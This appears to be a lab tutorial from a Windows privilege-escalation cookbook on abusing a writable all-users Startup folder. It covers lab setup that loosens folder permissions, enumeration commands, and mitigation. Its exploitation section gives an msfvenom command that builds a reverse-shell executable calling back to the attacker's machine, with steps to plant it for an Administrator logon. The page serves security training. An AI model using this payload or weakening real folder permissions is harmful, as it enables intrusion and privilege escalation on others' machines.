# Logon Autostart Execution (Startup Folder)

[Back to Main](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook?tab=readme-ov-file#vulnerabilities)

## Table of Contents

- [Logon Autostart Execution (Startup Folder)](#logon-autostart-execution-startup-folder)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup)
  - [Enumeration](#enumeration)
    - [Manual Enumeration](#manual-enumeration)
    - [Tool Enumeration](#tool-enumeration)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)

## Description

Logon Autostart Execution via Startup Folder is a Windows feature that enables specific programs or scripts to launch automatically when a user logs into the system. This feature allows these programs or scripts to launch automatically without any manual action from the user when the operating system starts up.

Attackers may exploit the Logon Autostart Execution feature by inserting malicious software into the Startup Folder. This enables the malicious code to automatically launch during system startup, potentially granting it elevated privileges. 

## Lab Setup

### Manual Lab Setup

:warning: <b>If you are using Windows 10 to proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.</b>

1) Navigate via File Explorer to the directory which contains StartUp Folder using the following path:

```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\
```

Outcome:

![Logon-Autostart-Execution-Startup-Folder-Lab-Setup-Part-1](/Pictures/AutostartStartupFolder-LabSetup-Part1.png)

2) Right click on Startup folder and choose properties option:

![Logon-Autostart-Execution-Startup-Folder-Lab-Setup-Part-2](/Pictures/AutostartStartupFolder-LabSetup-Part2.png)

3) Choose the 'Security' tab and select the 'Users' group:

![Logon-Autostart-Execution-Startup-Folder-Lab-Setup-Part-3](/Pictures/AutostartStartupFolder-LabSetup-Part3.png)

4) Assign Full Control or Read and Write permissions to the Users group and then press the 'Apply' button:

![Logon-Autostart-Execution-Startup-Folder-Lab-Setup-Part-4](/Pictures/AutostartStartupFolder-LabSetup-Part4.png)

### PowerShell Script Lab Setup 

:warning: <b>If you are using Windows 10/11 to proceed with this scenario, the local Administrator account needs to be enabled. I have created a PowerShell script named [EnableLocalAdmin.ps1](/Lab-Setup-Scripts/EnableLocalAdmin.ps1), designed to enable the local Administrator account and set a password. Please run this script with elevated privileges.</b>

To set up the lab with the 'Logon Autostart Execution (Startup Folder)' scenario use the custom PowerShell script named [LogonAutostartExecutionStartupFolder.ps1](/Lab-Setup-Scripts/LogonAutostartExecutionStartupFolder.ps1).

Open a PowerShelll with local Administrator privileges and run the script:

```
.\LogonAutostartExecutionStartupFolder.ps1
```

Outcome:

![Logon-Autostart-Execution-Startup-Folder-Lab-Setup-Script](/Pictures/AutostartStartupFolder-LabSetup-Script.png)

## Enumeration

### Manual Enumeration

To perform manual enumeration and identify whether a Windows workstation is vulnerable to the Startup Folder Autoruns issue, you can use the following command from a command prompt:

```
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

Outcome:

![AutostartStartupFolder-Manual-Enumeration](/Pictures/AutostartStartupFolder-Manual-Enumeration.png)

### Tool Enumeration

To perform an enumeration of the `Startup Folder Autoruns` vulnerability, you can use accesschk.exe or accesschk64.exe from Sysinternals Suite and execute the following command with appropriate arguments:

```
accesschk.exe /accepteula "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

Outcome:

![AutostartStartupFolder-Tool-Enumeration](/Pictures/AutostartStartupFolder-Tool-Enumeration.png)

## Exploitation

1) Use msfvenom to generate a malicious executable (exe) file that can be executed via the booting of the victim's machine:

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > shell.exe
```

2) Transfer the malicious executable file to victim's machine.

3) Move the malicious executable file to 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup'.

Outcome:

![AutostartStartupFolder-Exploitation](/Pictures/AutostartStartupFolder-Exploitation.png)

4) Open a listener on your Kali machine.

5) Reboot the victim's machine and login as Adminstrator:

![Reboot-victim-machine](/Pictures/Reboot-Victim-Machine2.png)

6) Verify the reverse shell on your Kali machine:

![Reverse-Shell-As-Admin-StartupFolderAutoRuns](/Pictures/Reverse-Shell-As-Admin-RegistryAutoRuns.png)

## Mitigation

Properly configured permissions within the Startup Folder act as a preventive measure against unauthorized modifications or executions of files within the directory. This proactive approach effectively reduces the likelihood of malicious programs or scripts launching automatically during system booting.

Moreover, to restore the default permissions of the Startup Folder, utilize the following commands with elevated privileges:

```
takeown /F "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /A /R /D Y
```

and

```
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /reset /T /C /Q
```

## References

- [Add an app to run automatically at startup in Windows 10 Microsoft](https://support.microsoft.com/en-us/windows/add-an-app-to-run-automatically-at-startup-in-windows-10-150da165-dcd9-7230-517b-cf3c295d89dd)
- [How To Find the Startup Folder in Windows 10 Softwarekeep](https://softwarekeep.com/help-center/how-to-find-the-startup-folder-in-windows-10)
